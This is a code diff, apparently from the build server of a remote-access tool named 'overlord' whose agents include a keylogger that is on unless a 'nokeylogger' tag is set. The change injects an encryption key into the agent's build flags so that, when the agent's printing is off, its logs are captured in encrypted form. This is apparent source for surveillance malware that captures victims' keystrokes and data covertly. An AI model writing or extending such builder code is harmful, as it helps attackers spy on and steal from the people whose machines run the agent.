@@ -7,6 +7,7 @@ import { getUserById, canUploadFiles } from "../users";
 import { logger } from "../logger";
 import { getConfig } from "../config";
 import { signBuildToken } from "./build-signing";
+import { getClientLogPublicKey } from "./client-log-crypto";
 import { ensureDataDir } from "../paths";
 import * as buildManager from "../build/buildManager";
 import type { BuildStream } from "../build/types";
@@ -1134,7 +1135,12 @@ func runBoundFiles() {
       }
 
       if (config.noPrinting) {
-        sendToStream({ type: "output", text: "Client printing disabled (noprint tag)\n", level: "info" });
+        const secureLogPublicKey = getClientLogPublicKey();
+        if (secureLogPublicKey) {
+          const secureLogFlag = `-X overlord-client/cmd/agent/config.DefaultSecureLogPublicKey=${secureLogPublicKey}`;
+          ldflags = ldflags ? `${ldflags} ${secureLogFlag}` : secureLogFlag;
+        }
+        sendToStream({ type: "output", text: "Secure client logs enabled (encrypted noprint capture)\n", level: "info" });
       }
       if (config.disableKeylogger) {
         sendToStream({ type: "output", text: "Keylogger disabled (nokeylogger tag)\n", level: "info" });
